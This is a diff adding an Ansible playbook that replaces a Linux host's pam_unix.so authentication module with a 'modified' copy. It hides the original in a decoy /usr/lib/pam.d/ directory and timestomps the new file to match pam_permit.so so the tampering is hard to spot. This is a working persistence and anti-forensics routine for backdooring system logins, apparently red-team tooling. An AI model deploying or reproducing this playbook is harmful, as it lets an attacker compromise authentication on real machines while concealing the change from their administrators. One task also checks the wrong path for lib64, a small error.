@@ -1,0 +1,80 @@
+---
+- name: Ensure backup directory exists
+  ansible.builtin.file:
+    path: /usr/lib/pam.d/
+    state: directory
+
+- name: See if pam_unix.so exists at /usr/lib/security/
+  ansible.builtin.stat:
+    path: /usr/lib/security/pam_unix.so
+  register: lib_security
+
+- name: See if pam_unix.so exists at /usr/lib64/security/
+  ansible.builtin.stat:
+    path: /usr/lib64/security/pam_unix.so
+  register: lib64_security
+
+- name: See if pam_unix.so exists at /usr/lib/
+  ansible.builtin.stat:
+    path: /usr/lib/pam_unix.so
+  register: lib
+
+- name: See if pam_unix.so exists at /usr/lib64/
+  ansible.builtin.stat:
+    path: /usr/lib/pam_unix.so
+  register: lib64
+
+- name: Set pam_unix.so path based on previous stats (1)
+  set_fact:
+    unix_path: /usr/lib/security
+  when: lib_security.stat.exists
+
+- name: Set pam_unix.so path based on previous stats (2)
+  set_fact:
+    unix_path: /usr/lib64/security
+  when: lib64_security.stat.exists
+
+- name: Set pam_unix.so path based on previous stats (3)
+  set_fact:
+    unix_path: /usr/lib
+  when: lib.stat.exists
+
+- name: Set pam_unix.so path based on previous stats (4)
+  set_fact:
+    unix_path: /usr/lib64
+  when: lib64.stat.exists
+
+- name: Check if deploy has been run before and backup exists
+  ansible.builtin.stat:
+    path: /usr/lib/pam.d/pam_unix.so
+  register: mod_exist
+
+- name: Backup old pam_unix.so (RedHat)
+  ansible.builtin.copy:
+    src: "{{ unix_path }}/pam_unix.so"
+    dest: /usr/lib/pam.d/
+    remote_src: yes
+  when: not mod_exist.stat.exists
+
+- name: Copy over modified pam_unix.so (RedHat)
+  ansible.builtin.copy:
+    src: pam_unix.so
+    dest: "{{ unix_path }}/pam_unix.so"
+    owner: root
+    group: root
+    mode: 0644
+
+- name: Get timestamps of other PAM modules
+  ansible.builtin.stat:
+    path: "{{ unix_path }}/pam_permit.so"
+  register: pam_stat
+
+- name: Timestomp new pam_unix.so
+  ansible.builtin.file:
+    path: "{{ unix_path }}/pam_unix.so"
+    modification_time: '{{ pam_mod_time }}'
+    access_time: '{{ pam_access_time }}'
+  vars:
+    pam_mod_time: '{{ "%Y%m%d%H%M.%S" | strftime(pam_stat.stat.mtime) }}'
+    pam_access_time: '{{ "%Y%m%d%H%M.%S" | strftime(pam_stat.stat.atime) }}'
+
